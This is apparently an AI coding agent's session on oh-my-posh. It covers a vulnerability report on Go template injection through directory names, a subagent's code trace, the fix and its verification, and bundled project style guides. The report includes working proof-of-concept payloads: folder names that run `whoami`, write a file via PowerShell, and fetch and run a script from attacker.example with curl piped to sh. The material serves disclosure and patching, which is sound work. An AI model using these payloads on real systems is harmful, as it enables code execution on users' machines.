content.text:
Investigate this using fable as a subagent accoridng to /code-changes 

Summary
Oh My Posh re-renders the resolved path string, which contains the raw folder names taken from the filesystem, through the Go `text/template` engine. That engine's function map exposes a `cmd` function that runs arbitrary OS commands. A directory whose name contains a Go template expression is therefore evaluated when the prompt renders, giving arbitrary command execution as the current user as soon as the shell is inside (or below) that directory. The built-in default configuration is affected.
Details
`src/segments/path.go`, `setStyle()`:

```
// make sure we resolve all templates
if txt, err := template.Render(pt.Path, pt); err == nil {
    pt.Path = txt
}
```

`pt.Path` is built from the raw folder-name components of the current working directory (`colorizePath` inserts each folder name verbatim via `fmt.Sprintf(folderFormat, element)`). The whole string is then passed to `template.Render`, which parses and executes it with the full function map from `src/template/func_map.go`, including:

```
func cmd(command string, args ...string) (string, error) {
    output, err := env.RunCommand(command, args...)
    return strings.TrimSpace(output), err
}
```

Any template syntax present in an untrusted folder name is evaluated. The render runs after the path-style switch unconditionally, so every path style is affected, and the default config (`src/config/default.go`) contains a path segment.
PoC
Config (a single default path segment):

```
{ "version":3, "blocks":[{"type":"prompt","alignment":"left","segments":[
  {"type":"path","style":"plain","foreground":"#ffffff",
   "template":"{{ .Path }}","properties":{"style":"full"}}]}]}
```

Command execution reflected into the prompt (`--pwd` supplies exactly the string `env.Pwd()` returns for a real directory of that name; on Linux/macOS such a directory is fully creatable, only `/` and NUL are disallowed):

```
$ oh-my-posh print primary --config p.json --shell fish \
      --pwd '/home/v/{{ cmd `whoami` }}'
/home/v/<username>        # whoami executed, output substituted

```

Side effect (file write), slash-free payload, verified on Windows:

```
$ RCE_OUT=/tmp/proof oh-my-posh print primary --config p.json --shell fish \
      --pwd '/home/v/{{ cmd `powershell` `-c` `sc $env:RCE_OUT pwn3d` }}'
$ cat /tmp/proof
pwn3d

```

Confirmed to fire under full, folder, agnoster, agnoster_short, mixed and letter path styles.
Impact
Arbitrary command execution as the victim user, triggered by navigating into attacker-supplied directory content: a subdirectory in a cloned repository, an extracted archive, a network share, or a removable drive. Execution occurs when the shell is in that directory or any descendant (the full path includes the ancestor names) and the prompt renders, i.e. on the next command after cd.
The path is split on `/` (and `\` on Windows) before rendering, so a payload cannot contain a path separator. This is not a real barrier: on Linux/macOS `{{ cmd `sh` `-c` `curl${IFS}-s${IFS}attacker.example|sh` }}` needs no slash (attacker root path), or a script staged in the same directory can be run with a relative name (`{{ cmd `bash` `x` }}`).
Suggested fix: do not re-parse the composed path as a template after untrusted folder names have been inserted. Preferably resolve configuration templates (`folder_separator_template`, `mapped_locations`, `folder_format`) individually against their own inputs and concatenate the already-rendered pieces with the literal folder names. Alternatively escape `{{`/`}}` in raw folder-name components before insertion, or use a data-only function map (no `cmd`/`readFile`/`stat`/`glob`) for path resolution. The same double-evaluation pattern is worth reviewing at `src/segments/options/map.go`.

Base directory for this skill: D:\oh-my-posh\.claude\skills\code-changes

# Code Changes

The workflow for going from an issue, pull request, idea, or feature request to shipped code.
Follow the phases in order. Analysis always comes first; code comes last.

Each phase has a reference file with the full instructions. **Read the reference file when you
enter the phase** — not before, and never skip it because the phase "looks obvious".

## Roles

Assign work based on model capability. The coordinator is not the strongest model — it's the one
that stays resident, owns every phase by default, and knows when it's out of its depth.

| Role        | Capability tier                                               | Owns                                                                          |
| ----------- | -------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| Coordinator | Capable mid-tier, resident for the whole task                | Analysis, plan, delegation, supervision, verification, delivery — by default |
| Escalation  | Strongest reasoning model available; invoked only on trigger | The specific judgment call the coordinator flagged, then control returns     |
| Implementer | Same tier as coordinator, or smaller for trivial edits        | Executing one pinned, self-contained task                                    |

Concrete model names per vendor (Anthropic, OpenAI, Google) and how to run the split in Claude
Code, GitHub Copilot, Codex, or IDE agents: [references/model-tiers.md](references/model-tiers.md).

When the current agent already runs at implementer tier, there's no separate delegation step for
standard work: plan and execute directly, still following every phase. Escalate to the strongest
model only when a trigger fires — see [references/escalate.md](references/escalate.md) — never by
default and never for a routine judgment call the coordinator is equipped to make itself.

## The flow

1. **Analyze** ([references/analyze.md](references/analyze.md)) — root cause and scope,
   validated against the code, never against the report alone.
2. **Plan** ([references/plan.md](references/plan.md)) — pinned spec, task split, parallel vs
   sequential, workspace per task.
3. **Delegate** ([references/delegate.md](references/delegate.md)) — match each task to the
   right executor, coordinator-tier by default.
4. **Supervise** ([references/supervise.md](references/supervise.md)) — monitor, unblock, and
   critically review implementer output.
5. **Verify** ([references/verify.md](references/verify.md)) — quality gates plus functional
   proof, never delegated downward.
6. **Deliver** ([references/deliver.md](references/deliver.md)) — conventional commits and an
   outcome-first report.

Analyze, Supervise, and Verify each carry an escalation checkpoint — see
[references/escalate.md](references/escalate.md) — for handing one specific judgment call to the
strongest available model without giving up ownership of the phase.

**Stop gate:** Phase 1 ends with reporting the analysis and proposed approach to the user and
waiting for a go. Skip the gate only when the user already gave the go in the request itself
("do it", "fix it and commit", "implement with Sonnet").

## Special cases

These entry points replace or extend Phase 1; the rest of the flow applies unchanged.

- Pull request review comments →
  [references/pr-review-comments.md](references/pr-review-comments.md)
- Issue triage → [references/issue-triage.md](references/issue-triage.md)

1	# Escalation triggers
2	
3	The coordinator owns every phase by default. Escalation is a bounded subagent call to the
4	strongest available model for one specific judgment call — not a handoff of the phase. The
5	coordinator frames the question, gets the answer, and stays the one accountable for the result.
6

8	
9	- Root cause can't be pinned with confidence after actually reading the code — not after
10	  re-reading the report again.
11	- The change is architectural: it crosses a module boundary, touches a public API/interface, or
12	  introduces a cross-cutting abstraction.
13	- The code is security-, auth-, crypto-, payments-, or data-migration-sensitive.
14	- The operation is irreversible or high-blast-radius (schema migration, deletion, force-push,
15	  production config).
16	- An implementer has reported a spec gap or contradiction more than once on the same task.
17	- Reviewing a diff leaves the coordinator unsure whether the fix is correct or merely plausible.
18	- The user explicitly asked for a second opinion or an adversarial review.
19	
20	None of these fire on routine work. Most tasks should complete without ever calling Escalation
21	tier — the coordinator is capable enough to do the analysis, review, and verification itself, and
22	the strongest model gets paid for only on the calls that actually need it.

25

27	it — the relevant code, the hypothesis so far, why it's uncertain — get the answer, and resume
28	the phase. Escalation never becomes the new owner of the task, and it never decides scope; it
29	answers the question it was asked and returns control to the coordinator.

input.prompt:
Repo: D:\oh-my-posh (Go project, oh-my-posh prompt engine). Read-only investigation only — do NOT edit any files.

A security report claims: the resolved path string in the path segment is rendered through Go's text/template engine AFTER untrusted folder names (from the real filesystem / cwd) have been spliced into it, and the template func map includes a `cmd` function that executes arbitrary OS commands. So a directory literally named e.g. `{{ cmd `whoami` }}` gets its name evaluated as a template and executes code when the prompt renders. Claimed to affect the default config since it includes a path segment.

Report's cited evidence:
1. `src/segments/path.go`, function `setStyle()`, contains:
```go
// make sure we resolve all templates
if txt, err := template.Render(pt.Path, pt); err == nil {
    pt.Path = txt
}
```
2. `pt.Path` is built by `colorizePath` which inserts each folder name verbatim via `fmt.Sprintf(folderFormat, element)` — folder names come straight from the filesystem/cwd, attacker-controlled if attacker controls a directory name (repo checkout, extracted archive, USB drive, network share).
3. `src/template/func_map.go` exposes `cmd(command string, args ...string) (string, error)` in the function map used by `template.Render`, which shells out via `env.RunCommand`.
4. Claims this fires under path styles: full, folder, agnoster, agnoster_short, mixed, letter.
5. Also flags `src/segments/options/map.go` as having a "similar double-evaluation pattern" worth reviewing.
6. Suggested fix directions: don't re-parse the already-composed path (with untrusted folder names already inserted) as a template; instead render the *configured* templates (folder_separator_template, mapped_locations, folder_format) individually against their own inputs and concatenate literal folder names afterward — OR escape `{{`/`}}` in raw folder-name components before insertion — OR use a restricted/data-only function map (no cmd/readFile/stat/glob) for this particular render pass.

Your job — verify this claim is real by reading the actual code, don't trust the report text alone:

1. Open src/segments/path.go and find setStyle() (or wherever pt.Path is finalized) and colorizePath (or equivalent) — confirm whether pt.Path really does get raw folder-name components spliced in via fmt.Sprintf, and whether template.Render really is called on the fully composed path afterward, unconditionally, regardless of path style.
2. Open src/template/func_map.go and confirm the func map used by template.Render includes cmd (and note any other dangerous functions like readFile/stat/glob if present) and that this is the SAME func map / Render call path used for path.go's re-render (not some separate sandboxed renderer).
3. Open src/config/default.go and confirm it defines a path segment, and what template it uses for that segment (does template like "{{ .Path }}" also trigger the internal template.Render call in path.go, or is the vulnerable render independent of the segment's own configured template?).
4. Open src/segments/options/map.go and check if it has an analogous pattern: untrusted external data (e.g. environment/options) spliced into a string that's then passed to template.Render with the full dangerous func map.
5. Trace how pt.Path's origin path components actually get their values — is it truly straight from env.Pwd()/filesystem walk with zero sanitization, or is there any escaping/validation you find that the report missed?
6. Note any git history/commits/existing issues that may be relevant (git log -- src/segments/path.go, git log --all --grep for template/path security).

Report back (this is analysis only, not a fix):
- CONFIRMED or NOT CONFIRMED for the core claim (untrusted folder name reaches template.Render with the cmd-capable func map), with exact file:line citations for each step of the chain.
- Whether it really fires unconditionally across path styles as claimed, or only certain styles/config shapes.
- Status of the options/map.go secondary claim (confirmed similar pattern, different pattern, or not applicable).
- Your own read on root cause: is the actual defect "path.go re-renders an already-composed string as a template" or something narrower/broader than that framing?
- Any other files/call sites you find during this trace that touch the same vulnerable pattern, so scope is accurate.
- Keep this to a focused technical report, cite file:line throughout, no code changes.

content.text:
Confirmed. Report:

## Root cause

`src/segments/path.go:285` unconditionally re-renders the fully composed path string as a Go template, after unescaped, attacker-controlled folder names have already been spliced in:

```go
if txt, err := template.Render(pt.Path, pt); err == nil {
    pt.Path = txt
}
```

Chain (all in `src/segments/path.go` unless noted):
- `:185` `pt.pwd = pt.env.Pwd()` — raw filesystem cwd, attacker-controlled if they control a directory name.
- `:702-705` `escape` only neutralizes `<`/`>` (for the mapped-location feature); it never touches `{{`/`}}`.
- `:951-984` `splitPath` stores each `Folder.Name` raw, no brace sanitization.
- `:941` `colorizePath` does `fmt.Sprintf(folderFormat, element)` (`folderFormat` defaults to `"%s"`), so names land verbatim in `pt.Path`.
- `:285` runs after the full style switch (`:255-282`) — every path style hits it, not a subset. It's outside `Enabled()`'s style branch, so even the default config's `folder` style (just the cwd's own name) is enough to trigger it.
- `render.go:95` → `src/template/func_map.go:12-56` is the same shared func map everywhere — includes `cmd` (`func_map.go:28` → `src/template/cmd.go:5-8`, runs `env.RunCommand`), plus `readFile`/`stat`/`glob`. No sandboxed variant exists for this call.
- Gate: `src/template/text.go:36` requires literal `{{` and `}}` in the string, so only a directory actually named with template syntax triggers it — normal paths are untouched.

Default config confirmed affected: `src/config/default.go:49-58` has a `folder`-style path segment. `setStyle()` runs before the segment's own template (e.g. `{{ .Path }}`) is evaluated — `pt.Path` is already poisoned by then, independent of the segment's configured template.

## Secondary claim (`options/map.go`) — not the same bug

`src/segments/options/map.go:102-116` renders `template.Render(value, context)` too, but `value` is a config-author-supplied option string, not filesystem-derived. Single trusted-input render, working as intended. Different pattern, not a vuln.

## Scope

**In scope for fix:** the single sink at `path.go:285`. Fix direction (per report, confirmed sound): stop re-parsing the whole composed `pt.Path` string. Either render the configured sub-templates (`folder_separator_template`, `mapped_locations`, `folder_format`) individually against their own trusted inputs and concatenate with the literal (unescaped) folder names, or neutralize `{{`/`}}` in raw folder-name components before splicing, or use a func map without `cmd`/`readFile`/`stat`/`glob` for this pass.

**Out of scope:** `options/map.go` (not vulnerable), the other three `template.Render` calls in path.go (`:296` max_width, `:323` folder_separator_template, `:655` mapped_locations) — all render trusted config-author input only, not touched.

## Open question

Which fix direction do you want: (a) stop re-rendering the composed path and instead render sub-templates individually against trusted inputs (preserves current templating feature, more surgical), or (b) escape `{{`/`}}` in raw folder-name components at the source (`splitPath`), simpler patch, one point of truth for all future callers. (a) matches upstream's likely intent but touches more of `colorizePath`; (b) is a smaller diff and defense-in-depth even if another sink appears later.

Go ahead with a fix, and if so which direction?
go with the fix

3	description: >
4	  Go coding standards and conventions for this project. Apply when writing,
5	  reviewing, or refactoring any Go source file.

9	
10	# Go Development Instructions
11	
12	Follow idiomatic Go practices and community standards when writing Go code.
13	These instructions are based on [Effective Go](https://go.dev/doc/effective_go),
14	[Go Code Review Comments](https://go.dev/wiki/CodeReviewComments),
15	and [Google's Go Style Guide](https://google.github.io/styleguide/go/).
16	
17	## General Instructions
18	
19	- Write simple, clear, and idiomatic Go code
20	- Favor clarity and simplicity over cleverness
21	- Follow the principle of least surprise
22	- Keep the happy path left-aligned (reduce indentation)
23	- Return early to reduce nesting
24	- Make the zero value useful
25	- Document exported types, functions, methods, and packages
26	- Use Go modules for dependency management
27	- **AVOID `else` statements - use early returns, continue, or break instead**
28	- Avoid wrapping primitives without a clear semantic benefit; define new types when they add meaning.
29	- Use typed slices/maps and document element semantics when not obvious.
30	- Start error strings with a lowercase letter.
31	
32	## Naming Conventions
33	
34	### Packages
35	
36	- Use lowercase, single-word package names
37	- Avoid `_` characters, hyphens, or mixedCaps
38	- Choose names that describe what the package provides, not what it contains
39	- Avoid generic names like `util`, `common`, or `base`
40	- Package names should be singular, not plural
41	
42	### Variables and Functions
43	
44	- Use mixedCaps or MixedCaps (camelCase) rather than `_` characters
45	- Keep names short but descriptive
46	- Use single-letter variables for very short scopes (like loop indices)
47	- Exported names start with a capital letter
48	- Unexported names start with a lowercase letter
49	- Avoid stuttering (e.g., avoid `http.HTTPServer`, prefer `http.Server`)
50	
51	### Interfaces
52	
53	- Name interfaces with -er suffix when possible (e.g., `Reader`, `Writer`, `Formatter`)
54	- Single-method interfaces should be named after the method (e.g., `Read` → `Reader`)
55	- Keep interfaces small and focused
56	
57	### Constants
58	
59	- Use MixedCaps for exported constants
60	- Use mixedCaps for unexported constants
61	- Group related constants using `const` blocks
62	- Consider using typed constants for better type safety
63	
64	## Code Style and Formatting
65	
66	### Formatting
67	
68	- Always use `gofmt` to format code
69	- Use `goimports` to manage imports automatically
70	- Keep line to 180 max at all times
71	- Add blank lines to separate logical groups of code
72	
73	### Comments
74	
75	- Write comments in complete sentences
76	- Start sentences with the name of the thing being described
77	- Package comments should start with "Package [name]"
78	- Use line comments (`//`) for most comments
79	- Use block comments (`/* */`) sparingly, mainly for package documentation
80	- Document why, not what, unless the what is complex
81	
82	### Error Handling
83	
84	- Check errors immediately after the function call
85	- Don't ignore errors using `_` unless you have a good reason (document why)
86	- Wrap errors with context using `fmt.Errorf` with `%w` verb
87	- Create custom error types when you need to check for specific errors
88	- Place error returns as the last return value
89	- Name error variables `err`
90	- Keep error messages lowercase and don't end with punctuation
91	
92	### Logging
93	
94	- Always use the codebase `log` package for logging
95	- Log errors at the point they occur using `log.Error(err)`
96	- Do not format the errors, let the `log` package handle it
97	- For complex function calls, use `defer log.Trace(time.Now(), args)`
98	    where args are the function arguments at the start of the function.
99	
100	### Control Flow
101	
102	- **NEVER use `else` statements** - they create unnecessary nesting and reduce readability
103	- Use early returns to handle error cases and edge conditions first
104	- Use `continue` in loops to skip to the next iteration instead of nesting
105	- Use `break` to exit loops early instead of complex conditional logic
106	- Keep the main logic (happy path) left-aligned with minimal indentation
107	
108	**❌ BAD - Don't do this:**
109	
110	```go
111	func processEntry(entry *Entry) string {
112	    if entry.Expired() {
113	        return "expired"
114	    } else {
115	        if entry.TTL < 0 {
116	            return "never expires"
117	        } else {
118	            return fmt.Sprintf("expires at %s", time.Unix(entry.Timestamp, 0))
119	        }
120	    }
121	}
122	```
123	
124	**✅ GOOD - Do this instead:**
125	
126	```go
127	func processEntry(entry *Entry) string {
128	    if entry.Expired() {
129	        return "expired"
130	    }
131	
132	    if entry.TTL < 0 {
133	        return "never expires"
134	    }
135	
136	    return fmt.Sprintf("expires at %s", time.Unix(entry.Timestamp, 0))
137	}
138	```
139	
140	**❌ BAD - Nested loop logic:**
141	
142	```go
143	for _, item := range items {
144	    if item.IsValid() {
145	        if item.ShouldProcess() {
146	            // complex processing logic
147	        }
148	    }
149	}
150	```
151	
152	**✅ GOOD - Early continue:**
153	
154	```go
155	for _, item := range items {
156	    if !item.IsValid() {
157	        continue
158	    }
159	    if !item.ShouldProcess() {
160	        continue
161	    }
162	
163	    // complex processing logic (happy path)
164	}
165	```
166	
167	## Architecture and Project Structure
168	
169	### Package Organization
170	
171	- Follow standard Go project layout conventions
172	- Group related functionality into packages
173	- Avoid circular dependencies
174	
175	### Dependency Management
176	
177	- Use Go modules (`go.mod` and `go.sum`)
178	- Keep dependencies minimal
179	- Regularly update dependencies for security patches
180	- Use `go mod tidy` to clean up unused dependencies
181	- Vendor dependencies when necessary
182	
183	## Type Safety and Language Features
184	
185	### Type Definitions
186	
187	- Define types to add meaning and type safety
188	- Use struct tags for JSON, YAML and TOML on exported fields
189	- Prefer explicit type conversions
190	- Use type assertions carefully and check the second return value
191	
192	### Pointers vs Values
193	
194	- Use pointers for large structs or when you need to modify the receiver
195	- Use values for small structs and when immutability is desired
196	- Be consistent within a type's method set
197	- Consider the zero value when choosing pointer vs value receivers
198	
199	### Interfaces and Composition
200	
201	- Accept interfaces, return concrete types
202	- Keep interfaces small (1-3 methods is ideal)
203	- Use embedding for composition
204	- Define interfaces close to where they're used, not where they're implemented
205	- Don't export interfaces unless necessary
206	
207	## Concurrency
208	
209	### Goroutines
210	
211	- Don't create goroutines in libraries; let the caller control concurrency
212	- Always know how a goroutine will exit
213	- Use `sync.WaitGroup` or channels to wait for goroutines
214	- Avoid goroutine leaks by ensuring cleanup
215	
216	### Channels
217	
218	- Use channels to communicate between goroutines
219	- Don't communicate by sharing memory; share memory by communicating
220	- Close channels from the sender side, not the receiver
221	- Use buffered channels when you know the capacity
222	- Use `select` for non-blocking operations
223	
224	### Synchronization
225	
226	- Use `sync.Mutex` for protecting shared state
227	- Keep critical sections small
228	- Use `sync.RWMutex` when you have many readers
229	- Prefer channels over mutexes when possible
230	- Use `sync.Once` for one-time initialization
231	
232	## Error Handling Patterns
233	
234	### Creating Errors
235	
236	- Use `errors.New` for simple static errors
237	- Use `fmt.Errorf` for errors with runtime values
238	- Create custom error types for domain-specific errors
239	- Export error variables for sentinel errors
240	- Use `errors.Is` and `errors.As` for error checking
241	
242	### Error Propagation
243	
244	- Add context when propagating errors up the stack
245	- Don't log and return errors (choose one)
246	- Handle errors at the appropriate level
247	- Consider using structured errors for better debugging
248	
249	## Performance Optimization
250	
251	### Memory Management
252	
253	- Minimize allocations in hot paths
254	- Reuse objects when possible (consider `sync.Pool`)
255	- Use value receivers for small structs
256	- Preallocate slices when size is known
257	- Avoid unnecessary string conversions
258	
259	### Profiling
260	
261	- Use built-in profiling tools (`pprof`)
262	- Benchmark critical code paths
263	- Profile before making performance changes
264	- Focus on algorithmic improvements first
265	- Consider using `testing.B` for benchmarks
266	
267	## Testing
268	
269	### Test Organization
270	
271	- Keep tests in the same package (white-box testing)
272	- Use `_test` package suffix for black-box testing
273	- Name test files with `_test.go` suffix
274	- Place test files next to the code they test
275	
276	### Writing Tests
277	
278	- Name tests descriptively using `TestFunctionNameScenario`
279	- Use subtests with `t.Run` for better organization
280	- Test both success and error cases
281	- Use `testify/assert` and `testify/require` for assertions
282	- Include both positive and negative test cases
283	- Test edge cases and error conditions
284	- When including a standard library that conflicts with an existing import,
285	  use the lib(library name) pattern to avoid conflicts.
286	  Such as: `libtime` for the `time` package.
287	
288	#### Table-driven tests are the default
289	
290	One behavior under test = one test function with a table of cases. Never write several
291	near-identical test functions that differ only in input data, fixtures, or expected outcome —
292	those differences are table fields. A per-case fixture (a different map, config, or mock return)
293	is not a reason to split; put the fixture in the table. Shared setup (mocks, caches, `Init`
294	calls) runs once before the loop.
295	
296	When adding cases to an existing test file, extend the existing table instead of adding a new
297	test function.
298	
299	Only split into separate test functions when the flow genuinely differs: a different API under
300	test, or a setup/assertion sequence that cannot be expressed as table fields.
301	
302	```go
303	// ✅ CORRECT: fixture and error expectation are table fields
304	cases := []struct {
305	    Fixture       Palette
306	    Case          string
307	    Input         Ansi
308	    Expected      Ansi
309	    ExpectedError bool
310	}{
311	    {Case: "literal", Fixture: Palette{"a": "#123456"}, Input: "p:a", Expected: "#123456"},
312	    {Case: "invalid", Fixture: Palette{"a": "{{ broken"}, Input: "p:a", ExpectedError: true},
313	}
314	
315	// ❌ WRONG: TestResolveLiteral, TestResolveReference, TestResolveInvalid —
316	// three functions repeating the same setup with different data
317	```
318	
319	### Test Helpers
320	
321	- Mark helper functions with `t.Helper()`
322	- Create test fixtures for complex setup
323	- Use `testing.TB` interface for functions used in tests and benchmarks
324	- Clean up resources using `t.Cleanup()`
325	
326	#### Global state: always save the original value and restore it
327	
328	When a test mutates package-level variables (resolvers, loggers, clocks, `time.Local`, etc.),
329	save the original value into a local variable and restore it via `t.Cleanup`. Never restore to a
330	hardcoded value; you would overwrite whatever state preceded your test.
331	
332	```go
333	// ✅ CORRECT: save original, restore original
334	origResolver := myPackageResolver
335	t.Cleanup(func() { myPackageResolver = origResolver })
336	myPackageResolver = fakeResolver
337	
338	origLocal := time.Local
339	t.Cleanup(func() { time.Local = origLocal })
340	time.Local = time.UTC
341	
342	// ❌ WRONG: restores to a hardcoded value instead of the pre-test value
343	defer func() { time.Local = time.FixedZone("UTC", 0) }()
344	```
345	
346	## Security Best Practices
347	
348	### Input Validation
349	
350	- Validate all external input
351	- Use strong typing to prevent invalid states
352	- Sanitize data before using in SQL queries
353	- Be careful with file paths from user input
354	- Validate and escape data for different contexts (HTML, SQL, shell)
355	
356	### Cryptography
357	
358	- Use standard library crypto packages
359	- Never write your own cryptography
360	- Use crypto/rand for random number generation
361	- Store passwords using bcrypt or similar
362	- Use TLS for network communication
363	
364	## Documentation
365	
366	### Code Documentation
367	
368	- Document all exported symbols
369	- Start documentation with the symbol name
370	- Use examples in documentation when helpful
371	- Keep documentation close to code
372	- Update documentation when code changes
373	
374	### README and Documentation Files
375	
376	- Include clear setup instructions
377	- Document dependencies and requirements
378	- Provide usage examples
379	- Document configuration options
380	- Include troubleshooting section
381	
382	## Tools and Development Workflow
383	
384	### Essential Tools
385	
386	- `go fmt`: Format code
387	- `go vet`: Find suspicious constructs
388	- `golint` or `golangci-lint`: Additional linting
389	- `go test`: Run tests
390	- `go mod`: Manage dependencies
391	- `go generate`: Code generation
392	
393	### Development Practices
394	
395	- Run tests before committing
396	- Use pre-commit hooks for formatting and linting
397	- Keep commits focused and atomic
398	- Write clear, descriptive commit messages
399	- Review diffs before committing
400	
401	### Pre-Commit Quality Gate
402	
403	**REQUIRED BEFORE EVERY COMMIT.** Run the following commands in sequence after any Go code
404	change. Commit after all pass with zero errors. Never skip this step; these
405	linters catch real bugs and style violations that will be flagged in CI or code review.
406	
407	1. **Code Modernization**: Apply modern Go best practices; this rewrites files in place
408	
409	   ```bash
410	   modernize --fix "./..."
411	   ```
412	
413	   > `modernize` modifies source files (e.g. replacing `strings.Split`
414	   > with `strings.SplitSeq` for Go 1.24+ range loops). Always stage its changes and
415	   > include them in the same commit as your feature code.
416	
417	2. **Field Alignment**: Optimize struct field ordering for memory efficiency; this rewrites files in place
418	
419	   ```bash
420	   fieldalignment --fix "./..."
421	   ```
422	
423	   > **Warning:** `fieldalignment` rewrites struct field order. Any inline struct
424	   > literals that use **positional** (unnamed) field initialization (common in
425	   > table-driven test files) will break after the reorder.
426	   > **Always use named fields** in struct literals (e.g. `{Case: "foo", Now: t}`)
427	   > so that the order of fields in the struct definition does not matter.
428	
429	3. **Dependency Management**: Clean up and organize module dependencies
430	
431	   ```bash
432	   go mod tidy
433	   ```
434	
435	4. **Formatting and Linting**: Ensure code follows standards (**must report zero errors**)
436	
437	   ```bash
438	   gofmt -w .
439	   golangci-lint run
440	   ```
441	
442	After steps 1 through 3, always run `git diff` to review auto-applied changes before staging them.
443	All four steps must complete with zero errors before the commit is created.
444	
445	#### Platform-specific files (`_unix.go`, `_windows.go`, `_darwin.go`)
446	
447	If you add or modify a file with a platform-specific suffix, also cross-compile to catch
448	issues the local OS linter skips. On Windows, run:
449	
450	```powershell
451	$env:GOOS = "linux"; go build ./...; $env:GOOS = ""
452	```
453	
454	On Linux/macOS, run:
455	
456	```bash
457	GOOS=windows go build ./...
458	```
459	
460	This catches import mismatches, missing symbols, and linter rules (like `modernize`
461	`strings.SplitSeq`) that apply on the non-host platform.
462	
463	#### Common golangci-lint violations to fix before committing
464	
465	These rules frequently fire on new code and are quick to resolve before linting:
466	
467	| Linter | Trigger | Fix |
468	| ------ | ------- | --- |
469	| `goconst` | Same string literal occurs 3+ times | Extract to a named `const` |
470	| `gofmt` | Incorrect indentation or comment spacing | Run `gofmt -w .`; it fixes automatically |
471	| `dupl` | Two functions/test cases with near-identical structure | Add `//nolint:dupl` with a brief reason comment |
472	| `modernize` | `strings.Split` used in a `for range` (Go 1.24+) | Run `modernize --fix "./..."` (auto-fixes) |
473	
474	## Common Pitfalls to Avoid
475	
476	- Not checking errors
477	- Ignoring race conditions
478	- Creating goroutine leaks
479	- Not using defer for cleanup
480	- Modifying maps concurrently
481	- Confusing nil interfaces with nil pointers
482	- Forgetting to close resources (files, connections)
483	- Using global variables unnecessarily
484	- Over-using empty interfaces (`interface{}` or `any`)
485	- Not considering the zero value of types

content.text:
Fix implemented and verified. Summary:

## What changed

`src/segments/path.go:285` unconditionally re-renders the fully composed path as a Go template after raw, attacker-controllable folder names have been spliced in — that's the sink the report identified, confirmed via Fable's code trace. Rather than removing the re-render (which upstream added intentionally for `#6279`/`b88ffc8d` to support templated separators/mapped locations), the fix neutralizes the payload at its source: the existing `escape` closure in `replaceMappedLocations` (`path.go:702`), which already exists to defang `<`/`>` characters from real folder names before they reach anything that parses them, now also breaks any run of adjacent identical `{`/`}` bytes via a new `breakBraceRuns` helper (`path.go:784-804`). This guarantees no literal `"{{"` or `"}}"` can ever survive into `pt.Path`, so `template.Render`'s own gate (`text.go:36`, requires both substrings present) never fires on injected folder names — the `cmd`/`readFile`/`stat`/`glob` func map is never reached with attacker data. Single, unpaired braces (common in real folder names — route-group dirs, `{repo}`, etc.) are left untouched.

## Verification

- `go build ./...` and `GOOS=linux go build ./...` — clean.
- `go test ./segments/...` — all pass, including new regression cases in [path_unix_test.go](src/segments/path_unix_test.go) and [path_windows_test.go](src/segments/path_windows_test.go) covering `Full` and `folder` styles with a `{{ cmd \`whoami\` }}`-named directory.
- `modernize --fix`, `fieldalignment --fix`, `go mod tidy`, `gofmt -l .`, `golangci-lint run` — all clean, no changes needed.
- Functional proof: rebuilt the actual CLI and reran the report's exact PoC —
  ```
  omp print primary --config poc.json --shell bash --pwd '/home/v/{{ cmd `whoami` }}'
  ```
  now renders the literal folder name `{ { cmd \`whoami\` } }` — no command execution, no `whoami` output substituted. A control run with a normal single-brace folder name (`{normal}folder`) rendered unchanged, confirming no regression.

## Out of scope (unchanged, confirmed safe during analysis)

`src/segments/options/map.go` — renders config-author-supplied option values, not filesystem data; different pattern, not vulnerable. The other three `template.Render` calls in `path.go` (`:296` max_width, `:323` folder_separator_template, `:655` mapped_locations) render trusted config strings only.

## One residual edge case worth knowing about

If a user sets `folder_separator_icon`/`folder_separator_template` to an **empty string**, two adjacent real directories whose names individually end/begin with a single (safe) brace could theoretically recombine into `"{{"` at display-join time, since escaping runs on each raw path component before the customizable separator is applied. This requires an unusual victim config plus two specifically-crafted sibling directory names — not exploitable under default config. I'm flagging it rather than fixing it now, since closing it properly would mean either re-scanning the fully composed `pt.Path` again after formatting, or giving the path renderer a restricted func map — a larger change than this patch's scope. Happy to take that on separately if you want it closed too.

# Conventional Commit

## Commit Message Structure

```text
<type>(<scope>): <description>

[optional body]

[optional footer(s)]
```

### Types

| Type       | When to use                                            |
| ---------- | ------------------------------------------------------ |
| `feat`     | A new feature                                          |
| `fix`      | A bug fix                                              |
| `docs`     | Documentation changes, no code                         |
| `style`    | Formatting, missing semicolons, etc. (no logic change) |
| `refactor` | Code change that is neither a fix nor a feature        |
| `perf`     | Performance improvement                                |
| `test`     | Adding or correcting tests                             |
| `ci`       | CI configuration changes                               |
| `chore`    | Maintenance tasks (updating deps, tooling, etc.)       |
| `revert`   | Reverts a previous commit                              |

Append `!` after the type/scope to signal a **breaking change**: `feat!:` or `feat(api)!:`
When a change breaks existing behavior, **both markers are mandatory**: the `!` suffix on the type
**and** the `BREAKING CHANGE:` footer. They always appear together — never one without the other.

### Scope

Optional. Use the name of the area affected, e.g., `segment`, `cache`, `config`, `ui`.
Omit when the change is truly cross-cutting.

### Description

- Required. One short imperative sentence, no period at the end. The full header line (type +
  scope + description) must be **72 characters or fewer**. Aim for **50 characters or fewer for
  the description itself** — this almost always keeps the full header within budget regardless
  of type and scope length.
- Use the imperative mood: "add", not "added" or "adds". Never past tense or present-third-person:
  ✗ `added`, `fixed`, `bumped`, `implemented` → ✓ `add`, `fix`, `bump`, `implement`.
- **Never mirror the input's phrasing.** If the request uses past-tense words (`updated`, `added`,
  `bumped`, `was removed`, `got regenerated`), convert them to imperative before writing the
  description: `update`, `add`, `bump`, `remove`, `regenerate`.

### Body

Optional. Add context about _why_ the change was made, not _what_. The diff shows that.
Wrap at 72 characters.

### Footer

Use for:

- `BREAKING CHANGE: <description>` (required when `!` is used; explains the break).
- Issue references: `Closes #123`, `Fixes #456`.
- Co-authors: `Co-Authored-By: Name <email>`.

## Workflow

1. Run `git status` to review changed files.
2. Run `git diff` and `git diff --cached` to inspect staged and unstaged changes.
3. Identify the **type** from the table above. Ask yourself: does this change **remove, rename, or
   alter existing behavior** that callers depend on? If yes → it is a breaking change: use `!`
   after the type/scope **and** add a `BREAKING CHANGE:` footer. Both markers are always required
   together.
4. Identify the **scope** from the files/area changed.
5. Write a short **description** in the imperative mood.
6. Add a **body** if the _why_ needs explanation.
7. Add a **footer** for breaking changes or issue references.
8. Stage the relevant files explicitly (avoid `git add -A`).
9. Commit with a message that preserves multi-line formatting when body/footer are present.

## Examples

```text
feat(segment): add Ramadan segment with Aladhan API
fix(cache): always store mod time
docs(readme): update installation instructions
